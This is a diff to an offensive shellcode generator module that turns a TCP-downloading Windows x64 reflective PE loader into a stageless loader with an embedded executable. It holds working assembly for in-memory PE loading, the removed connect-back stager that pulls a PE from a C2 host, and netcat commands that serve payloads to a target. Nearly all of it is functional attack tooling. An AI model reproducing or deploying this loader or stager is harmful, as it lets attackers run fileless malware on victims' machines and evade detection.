@@ -25,9 +25,9 @@ class Shellcode():
 
     name = f"Windows ({arch}) Reflective PE Loader"
 
-    module = f"{platform}/{arch}/reflective_pe_tcp"
+    module = f"{platform}/{arch}/reflective_pe"
 
-    example_run = f"{sys.argv[0]} -p {module} LHOST=192.168.81.144 LPORT=1337 -f c"
+    example_run = f"{sys.argv[0]} -p {module} EXE=/home/wetw0rk/shell-x64.exe -f c"
 
     ring = 3
 
@@ -35,36 +35,32 @@ class Shellcode():
 
     tested_platforms = ["Windows 10 (10.0.19045 N/A Build 19045)"]
 
-    summary = ("TCP-based reflective PE loader over IPV4 which executes a PE from a"
-               " remote server")
+    summary = ("Stageless reflective PE loader")
 
-    description = ("TCP based reflective PE loader over IPV4 that will connect to a remote C2 server"
-                   " and download a PE. Once downloaded, the PE will be executed in memory without"
-                   " touching disk.\n\n"
+    description = ("This shellcode stub operates as an x64 Reflective PE Loader, taking a buffer"
+                   " containing the contents of a PE file and loading it in memory, ultimately"
+                   " executing it. Depending on how this stub is delivered the contents of the"
+                   " PE will never touch disk.\n\n"    
 
-                   "As an example, you \"C2 Server\" can be as simple as Netcat:\n\n"
+                   "As an example, your \"C2 Server\" can be as simple as Netcat:\n\n"
 
-                   "    nc -w 15 -lvp 42 < payload.exe\n\n"
+                  f"    {sys.argv[0]} -p {module} EXE=/home/username/payload.exe -f raw | nc -lvp 8080"
+                   "\n\n"
 
-                   "Then you can generate the shellcode accordingly:\n\n"
+                   "You can then use the windows/x64/shellcode_exec_tcp stub within sickle to"
+                   " serve as the first stage when packaging your exploit, for example:\n\n"
 
-                   f"    {example_run}\n\n"
+                  f"    {sys.argv[0]} -p windows/x64/shellcode_exec_tcp LHOST=192.168.91.134 LPORT=8080 -f c"
+                   "\n\n"
 
-                   "Upon execution of the shellcode, you should get a connection from the target and"
-                   " your PE should execute in memory.")
+                   "Upon execution of the first stage, you should get a connection from the target, if using"
+                   " Netcat hit [CTRL]+[C]. Upon doing so, your PE should execute in memory.")
 
     arguments = {}
-    arguments["LHOST"] = {}
-    arguments["LHOST"]["optional"] = "no"
-    arguments["LHOST"]["description"] = "Listener host to receive the callback"
-
-    arguments["LPORT"] = {}
-    arguments["LPORT"]["optional"] = "yes"
-    arguments["LPORT"]["description"] = "Listening port on listener host"
-
-    arguments["ACKPK"] = {}
-    arguments["ACKPK"]["optional"] = "yes"
-    arguments["ACKPK"]["description"] = "File including it's path containing the acknowledgement packet response"
+    
+    arguments["EXE"] = {}
+    arguments["EXE"]["optional"] = "no"
+    arguments["EXE"]["description"] = "Executable to be loaded into memory and executed"
 
     def __init__(self, arg_object):
 
@@ -80,16 +76,7 @@ class Shellcode():
                 "CreateRemoteThread",
                 "WaitForSingleObject",
             ],
-            "Ws2_32.dll" : [
-                "WSAStartup",
-                "socket",
-                "connect",
-                "send",
-                "recv",
-            ],
             "msvcrt.dll" : [
-                "malloc",
-                "realloc",
                 "memset",
                 "memcpy",
             ]
@@ -101,10 +88,8 @@ class Shellcode():
             "wsaData"                       : 0x00,
             "sockaddr_name"                 : 0x00,
             "sockfd"                        : 0x00,
-            "buffer"                        : self.get_ackpk_len(),
+            "buffer"                        : 0x00,
             "pResponse"                     : 0x00,
-            "pTmpResponse"                  : 0x00,
-            "bytesRead"                     : 0x00,
             "hProcess"                      : 0x00,
             "pNtHeader"                     : 0x00,
             "lpvLoadedAddress"              : 0x00,
@@ -135,27 +120,6 @@ class Shellcode():
         self.storage_offsets = builder.gen_offsets(sc_args)
 
         return
-
-    def get_ackpk_len(self):
-        """Generates the size needed by the ACK packet sent to the C2 server.
-        Due to bugs encountered when passing raw strings, this function will
-        read from a file. In addition, it instantiates self.ack_packet.
-        Should no file be provided, a default string will be sent over TCP
-        instead.
-        """
-
-        argv_dict = modparser.argument_check(Shellcode.arguments, self.arg_list)
-        if (argv_dict == None):
-            exit(-1)
-
-        if ("ACKPK" not in argv_dict.keys()):
-            self.ack_packet = "The Only Thing They Fear Is You\r\n"
-        else:
-            self.ack_packet = extract.read_bytes_from_file(argv_dict["ACKPK"], 'r')
-
-        needed_space = math.ceil(len(self.ack_packet)/8) * 8
-
-        return needed_space
 
     def modify_section_perms(self):
         """Modify the permissions for each section in the PE file
@@ -396,9 +360,9 @@ get_dwImportsOffset:
     add rdx, {winnt._IMAGE_OPTIONAL_HEADER64.DataDirectory.offset}
     mov rax, {winnt.IMAGE_DIRECTORY_ENTRY_IMPORT}
     imul rax,{ctypes.sizeof(winnt._IMAGE_DATA_DIRECTORY)}
-    add rdx, rax
+    add rdx, rax 
     xor rax, rax
-    mov ax, [rdx]
+    mov eax, [rdx]
     mov r11, rax
     mov rcx, [rbp - {self.storage_offsets['pNtHeader']}]
     call rva2offset
@@ -500,57 +464,50 @@ rva2offset:
     push rbp
     mov rbp, rsp
     sub rsp, 0x10
-
     mov [rbp - 0x08], rcx
     mov [rbp - 0x10], r11
-
     xor r9, r9
     mov r8, rcx
     add r8, {winnt._IMAGE_NT_HEADERS64.FileHeader.offset}
     mov r9w, [r8 + {winnt._IMAGE_FILE_HEADER.NumberOfSections.offset}]
-    add rcx, 0x108
+    add rcx, {ctypes.sizeof(winnt._IMAGE_NT_HEADERS64)}
     mov [rbp - 0x08], rcx
     xor rdi, rdi
-
 loop:
     mov rcx, [rbp - 0x08]
     xor rax, rax
     xor rbx, rbx
-    mov rax, 0x28
+    mov rax, {ctypes.sizeof(winnt._IMAGE_SECTION_HEADER)}
     mul rdi
-
     add rcx, rax
     mov r8, rcx
     mov r12, r8
     add rcx, {winnt._IMAGE_SECTION_HEADER.VirtualAddress.offset}
     add r8, {winnt._IMAGE_SECTION_HEADER.Misc.offset}
-    mov ax, [rcx]
-    cmp r11, rax
+    mov eax, [rcx]
+    cmp r11d, eax
     jge in_range
     jmp not_in_range
-
 in_range:
-    mov bx, [r8]
-    add rbx, rax
-    cmp r11, rbx
-    jl calc_offset
-
+    mov ebx, [r8]
+    add ebx, eax
+    cmp r11d, ebx
+    jb calc_offset
 not_in_range:
     inc rdi
     cmp rdi, r9
     jl loop
     jmp calc_offset
-
 next_entry:
     jmp loop
-
 calc_offset:
+    xor rbx, rbx
     add r12, {winnt._IMAGE_SECTION_HEADER.PointerToRawData.offset}
-    mov r12, [r12]
-    add r12, r11
-    sub r12, rax
-    mov rax, r12
-
+    mov ebx, [r12]
+    add ebx, r11d
+    sub ebx, eax
+    xor rax, rax
+    mov eax, ebx
     leave
     ret
         """
@@ -579,7 +536,7 @@ get_dwOffsetToBaseRelocationTable:
     imul rax, {ctypes.sizeof(winnt._IMAGE_DATA_DIRECTORY)}
     add rdx, rax
     xor rax, rax
-    mov ax, [rdx]
+    mov eax, [rdx]
     mov r11, rax
     mov rcx, [rbp - {self.storage_offsets['pNtHeader']}]
     call rva2offset
@@ -593,7 +550,7 @@ get_dwTableSize:
     imul rax, {ctypes.sizeof(winnt._IMAGE_DATA_DIRECTORY)}
     add rdx, rax
     xor rcx, rcx
-    mov cx, [rdx + {winnt._IMAGE_DATA_DIRECTORY.Size.offset}]
+    mov ecx, [rdx + {winnt._IMAGE_DATA_DIRECTORY.Size.offset}]
     mov [rbp - {self.storage_offsets['dwTableSize']}], rcx
 
 get_pBaseRelocationTable:
@@ -624,7 +581,6 @@ get_numEntries:
 
 process_entries:
     mov [rbp - {self.storage_offsets['dwBlockIndex']}], rax
-
 get_wBlockType:
     xor rcx, rcx
     xor rbx, rbx
@@ -654,7 +610,7 @@ get_dwAddressOffset:
     mov rbx, [rbp - {self.storage_offsets['lpvPreferableBase']}]
     mov rcx, [rbp - {self.storage_offsets['pResponse']}]
     add rcx, rax
-    mov rax, rcx
+    mov rax, rcx 
     mov rcx, [rcx]
     sub [rax], rbx
     add [rax], r12
@@ -711,161 +667,6 @@ alloc_pe_home:
     mov rax, [rbp - {self.storage_offsets['VirtualAllocEx']}]
     call rax
     mov [rbp - {self.storage_offsets['lpvLoadedAddress']}], rax
-        """
-
-        return stub
-
-    def download_pe(self):
-        """Stager responsible for downloading the PE into memory
-        """
-
-        argv_dict = modparser.argument_check(Shellcode.arguments, self.arg_list)
-        if (argv_dict == None):
-            exit(-1)
-
-        if ("LPORT" not in argv_dict.keys()):
-            lport = 4444
-        else:
-            lport = int(argv_dict["LPORT"])
-
-        sock_buffer_size = 0x1000
-
-        stub = f"""
-call_WSAStartup:
-    mov rcx, 0x202
-    lea rdx, [rbp - {self.storage_offsets['wsaData']}]
-    mov rax, [rbp - {self.storage_offsets['WSAStartup']}]
-    call rax
-
-call_socket:
-    mov rcx, {ws2def.AF_INET}
-    xor rdx, rdx
-    inc dl
-    xor r8, r8
-    mov rax, [rbp - {self.storage_offsets['socket']}]
-    call rax
-    mov [rbp - {self.storage_offsets['sockfd']}], rax
-
-call_connect:
-    mov rcx, rax
-    mov r8, {ctypes.sizeof(ws2def.sockaddr)}
-    lea rdx, [rbp - {self.storage_offsets['sockaddr_name']}]
-    mov r9, {hex(convert.ip_str_to_inet_addr(argv_dict['LHOST']))}{struct.pack('<H', lport).hex()}0002
-    mov [rdx], r9
-    xor r9, r9
-    mov [rdx + 0x08], r9
-    mov rax, [rbp - {self.storage_offsets['connect']}]
-    call rax
-"""
-
-        packet_buffer = convert.from_str_to_xwords(self.ack_packet)
-        write_index = self.storage_offsets['buffer']
-
-        stub += f"\ncall_send:\n"
-
-        for i in range(len(packet_buffer["QWORD_LIST"])):
-            stub += "    mov rcx, 0x{}\n".format( struct.pack('<Q', packet_buffer["QWORD_LIST"][i]).hex() )
-            stub += "    mov [rbp-{}], rcx\n".format(hex(write_index))
-            write_index -= 8
-
-        for i in range(len(packet_buffer["DWORD_LIST"])):
-            stub += "    mov ecx, 0x{}\n".format( struct.pack('<L', packet_buffer["DWORD_LIST"][i]).hex() ) 
-            stub += "    mov [rbp-{}], ecx\n".format(hex(write_index))
-            write_index -= 4
-
-        for i in range(len(packet_buffer["WORD_LIST"])):
-            stub += "    mov cx, 0x{}\n".format( struct.pack('<H', packet_buffer["WORD_LIST"][i]).hex() )
-            stub += "    mov [rbp-{}], cx\n".format(hex(write_index))
-            write_index -= 2
-
-        for i in range(len(packet_buffer["BYTE_LIST"])):
-            stub += "    mov cl, {}\n".format( hex(packet_buffer["BYTE_LIST"][i]) )
-            stub += "    mov [rbp-{}], cl\n".format(hex(write_index))
-            write_index -= 1
-
-
-        stub += f"""
-    xor rcx, rcx
-    mov [rbp-{write_index}], cl
-    mov rcx, [rbp - {self.storage_offsets['sockfd']}]
-    lea rdx, [rbp - {self.storage_offsets['buffer']}]
-    mov r8, {len(self.ack_packet)}
-    xor r9, r9
-    mov rax, [rbp - {self.storage_offsets['send']}]
-    call rax
-
-allocate_main_buffer:
-    mov rcx, {sock_buffer_size}
-    mov rax, [rbp - {self.storage_offsets['malloc']}]
-    call rax
-    mov [rbp - {self.storage_offsets['pResponse']}], rax
-        
-allocate_tmp_buffer:
-    mov rcx, {sock_buffer_size}
-    mov rax, [rbp - {self.storage_offsets['malloc']}]
-    call rax
-    mov [rbp - {self.storage_offsets['pTmpResponse']}], rax
-
-init_index:
-    xor rax, rax
-    mov [rbp - {self.storage_offsets['index']}], rax
-
-download_stager:
-    nop
-
-call_memset:
-    mov rcx, [rbp - {self.storage_offsets['pTmpResponse']}]
-    xor rdx, rdx
-    mov r8, {sock_buffer_size}
-    mov rax, [rbp - {self.storage_offsets['memset']}]
-    call rax
-
-call_recv:
-    mov rcx, [rbp - {self.storage_offsets['sockfd']}]
-    mov rdx, [rbp - {self.storage_offsets['pTmpResponse']}]
-    mov r8, {sock_buffer_size}
-    xor r9, r9
-    mov rax, [rbp - {self.storage_offsets['recv']}]
-    call rax
-    mov [rbp - {self.storage_offsets['bytesRead']}], rax
-
-check_write:
-    test rax, rax
-    jle download_complete
-
-fruit_loop:
-    mov r10, [rbp - {self.storage_offsets['index']}]
-    mov rcx, [rbp - {self.storage_offsets['bytesRead']}]
-    mov rbx, [rbp - {self.storage_offsets['pResponse']}]
-    mov rax, [rbp - {self.storage_offsets['pTmpResponse']}]
-    add rbx, r10
-write_data:
-    mov dl, [rax]
-    mov [rbx], dl
-    inc r10
-    inc rbx
-    inc rax
-    dec rcx
-    mov [rbp - {self.storage_offsets['index']}], r10
-    test rcx, rcx
-    jnz write_data
-
-check_realloc:
-    mov rcx, [rbp - {self.storage_offsets['bytesRead']}]
-    test rcx, rcx
-    jle download_complete
-
-realloc:
-    mov rax, [rbp - {self.storage_offsets['realloc']}]
-    mov rcx, [rbp - {self.storage_offsets['pResponse']}]
-    mov rdx, [rbp - {self.storage_offsets['index']}]
-    add rdx, {sock_buffer_size}
-    call rax
-    mov [rbp - {self.storage_offsets['pResponse']}], rax
-    jmp download_stager
-
-download_complete:
-    nop
         """
 
         return stub
@@ -1019,6 +820,14 @@ get_{imports[func]}:
         """Returns bytecode generated by the keystone engine.
         """
 
+        argv_dict = modparser.argument_check(Shellcode.arguments, self.arg_list)
+        if (argv_dict == None):
+            exit(-1)
+
+        self.exe_stager = extract.read_bytes_from_file(argv_dict["EXE"])
+        if self.exe_stager == None:
+            exit(-1)
+
         shellcode = f"""
 _start:
     push rbp
@@ -1032,7 +841,11 @@ _start:
 
         shellcode += self.resolve_functions()
 
-        shellcode += self.download_pe()
+        shellcode += f"""
+load_exe_file:
+    lea rax, [rip + exe_file]
+    mov [rbp - {self.storage_offsets['pResponse']}], rax
+        """
 
         shellcode += self.alloc_image_space()
 
@@ -1078,6 +891,10 @@ call_WaitForSingleObject:
 
         shellcode += self.rva_to_offset()
 
+        shellcode += """
+exe_file:
+"""
+
         return shellcode
 
     def get_shellcode(self):
@@ -1085,7 +902,9 @@ call_WaitForSingleObject:
         """
 
         generator = Assembler(Shellcode.arch)
-
         src = self.generate_source()
 
-        return generator.get_bytes_from_asm(src)
+        shellcode = generator.get_bytes_from_asm(src)
+        shellcode += self.exe_stager
+
+        return shellcode
